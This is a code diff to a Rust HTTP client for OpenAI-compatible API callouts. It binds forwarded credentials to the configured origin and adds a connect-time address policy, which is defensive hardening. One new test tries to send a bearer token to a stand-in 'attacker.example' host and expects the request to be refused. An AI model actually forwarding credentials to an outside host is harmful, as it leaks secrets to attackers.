@@ -29,7 +29,10 @@ pub(crate) use self::{
     error::ApiClientError,
     url::{resource_url, validate_base_url, validate_forward_headers},
 };
-use crate::subrequest::{self, SubRequest, SubRequestClient, SubRequestError, SubResponse};
+use crate::{
+    callout_target::AddressPolicy,
+    subrequest::{self, SubRequest, SubRequestClient, SubRequestError, SubResponse},
+};
 
 /// Configuration for constructing an [`ApiClient`].
 ///
@@ -46,6 +49,8 @@ pub(crate) struct ApiClientConfig {
     pub max_response_bytes: usize,
     /// Header names to forward from the original request.
     pub forward_header_names: Vec<http::HeaderName>,
+    /// Connect-time policy for the configured API target.
+    pub address_policy: AddressPolicy,
 }
 
 /// Shared HTTP client for OpenAI-compatible API callouts.
@@ -58,6 +63,8 @@ pub(crate) struct ApiClientConfig {
 pub(crate) struct ApiClient {
     /// Base URL of the API endpoint (trailing slash stripped).
     api_base_url: String,
+    /// Normalized origin to which forwarded credentials are bound.
+    target_origin: Option<String>,
     /// Sub-request client for bounded execution.
     client: SubRequestClient,
     /// Per-request timeout.
@@ -67,6 +74,8 @@ pub(crate) struct ApiClient {
     /// Header names to forward from the original downstream
     /// request.
     forward_header_names: Vec<http::HeaderName>,
+    /// Connect-time policy for the configured API target.
+    address_policy: AddressPolicy,
 }
 
 /// Map a [`SubRequestError`] to an [`ApiClientError`].
@@ -89,14 +98,20 @@ impl ApiClient {
             timeout,
             max_response_bytes,
             forward_header_names,
+            address_policy,
         } = config;
 
+        let target_origin = ::url::Url::parse(&api_base_url)
+            .ok()
+            .map(|url| url.origin().ascii_serialization());
         Self {
             api_base_url: api_base_url.trim_end_matches('/').to_owned(),
+            target_origin,
             client,
             timeout,
             max_response_bytes,
             forward_header_names,
+            address_policy,
         }
     }
 
@@ -223,6 +238,16 @@ impl ApiClient {
         body: Bytes,
         max_response_bytes: usize,
     ) -> Result<SubResponse, ApiClientError> {
+        let candidate_origin = ::url::Url::parse(url)
+            .ok()
+            .map(|url| url.origin().ascii_serialization());
+        if candidate_origin.is_none() || candidate_origin != self.target_origin {
+            return Err(ApiClientError::Transport {
+                source: SubRequestError::InvalidRequest(
+                    "callout URL changed the configured credential origin".to_owned(),
+                ),
+            });
+        }
         let request = SubRequest {
             method,
             uri: http::Uri::default(),
@@ -230,9 +255,16 @@ impl ApiClient {
             body,
         };
 
-        let mut response = subrequest::execute_url(&self.client, url, request, max_response_bytes, self.timeout)
-            .await
-            .map_err(map_subrequest_error)?;
+        let mut response = subrequest::execute_url(
+            &self.client,
+            url,
+            request,
+            max_response_bytes,
+            self.timeout,
+            self.address_policy,
+        )
+        .await
+        .map_err(map_subrequest_error)?;
         sanitize_response_headers(&mut response.headers);
         Ok(response)
     }
@@ -331,6 +363,7 @@ mod tests {
             timeout: Duration::from_millis(1_000),
             max_response_bytes: 1_048_576,
             forward_header_names: Vec::new(),
+            address_policy: AddressPolicy::AllowPrivate,
         })
     }
 
@@ -351,6 +384,7 @@ mod tests {
                 http::header::AUTHORIZATION,
                 http::HeaderName::from_static("x-tenant-id"),
             ],
+            address_policy: AddressPolicy::AllowPrivate,
         });
 
         let mut request_headers = HeaderMap::new();
@@ -378,6 +412,25 @@ mod tests {
         let client = test_client("http://ogx:8321");
         let url = client.resource_url("v1/files", "file-abc", Some("content")).unwrap();
         assert_eq!(url, "http://ogx:8321/v1/files/file-abc/content");
+    }
+
+    #[tokio::test]
+    async fn forwarded_credentials_are_bound_to_configured_origin() {
+        let client = test_client("https://api.example.com");
+        let mut headers = HeaderMap::new();
+        headers.insert(http::header::AUTHORIZATION, "Bearer secret".parse().unwrap());
+
+        let error = client
+            .get("https://attacker.example/v1/files", &headers, 1024)
+            .await
+            .expect_err("a derived URL on another origin must be rejected before I/O");
+
+        assert!(matches!(
+            error,
+            ApiClientError::Transport {
+                source: SubRequestError::InvalidRequest(detail),
+            } if detail.contains("configured credential origin")
+        ));
     }
 
     #[tokio::test]
@@ -594,6 +647,7 @@ mod tests {
             timeout: Duration::from_millis(1_000),
             max_response_bytes: 1_048_576,
             forward_header_names: vec![http::header::CONTENT_TYPE],
+            address_policy: AddressPolicy::AllowPrivate,
         });
 
         let mut headers = HeaderMap::new();
@@ -824,6 +878,7 @@ mod tests {
             timeout: Duration::from_millis(50),
             max_response_bytes: 1_048_576,
             forward_header_names: Vec::new(),
+            address_policy: AddressPolicy::AllowPrivate,
         });
 
         let err = client
